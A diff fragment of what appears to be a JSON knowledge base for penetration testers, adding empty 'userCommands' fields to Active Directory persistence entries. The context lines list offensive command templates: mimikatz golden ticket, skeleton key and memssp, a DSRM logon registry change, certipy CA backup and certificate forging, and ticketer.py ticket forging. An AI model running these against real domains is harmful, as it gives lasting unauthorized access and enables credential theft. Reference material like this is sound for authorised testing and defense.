             "mimikatz \"kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt\"",
             "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>"
           ],
+          "userCommands": [],
           "tools": [
             "mimikatz",
             "ticketer.py"
@@ -2932,6 +3051,7 @@
           "commands": [
             "PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD"
           ],
+          "userCommands": [],
           "tools": [
             "PowerShell"
           ],
@@ -2948,6 +3068,7 @@
           "commands": [
             "mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" #password is mimikatz"
           ],
+          "userCommands": [],
           "tools": [
             "mimikatz"
           ],
@@ -2964,6 +3085,7 @@
           "commands": [
             "mimikatz \"privilege::debug\" \"misc::memssp\" \"exit\""
           ],
+          "userCommands": [],
           "tools": [
             "mimikatz"
           ],
@@ -2981,6 +3103,7 @@
             "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
             "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>"
           ],
+          "userCommands": [],
           "tools": [
             "certipy"
           ],
@@ -2997,6 +3120,7 @@
           "commands": [
             "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>"
           ],
+          "userCommands": [],
           "tools": [
             "ticketer.py"
           ],
@@ -3013,6 +3137,7 @@
           "commands": [
             "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored'"
           ],
+          "userCommands": [],
           "tools": [
             "ticketer.py"
           ],
@@ -3025,6 +3150,7 @@
           "detail": "Review the source condition and record the result.",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "persistence.md",
           "next": []
@@ -3035,6 +3161,7 @@
           "detail": "Review the source condition and record the result.",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "persistence.md",
           "next": []
@@ -3045,6 +3172,7 @@
           "detail": "Review the source condition and record the result.",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "persistence.md",
           "next": []
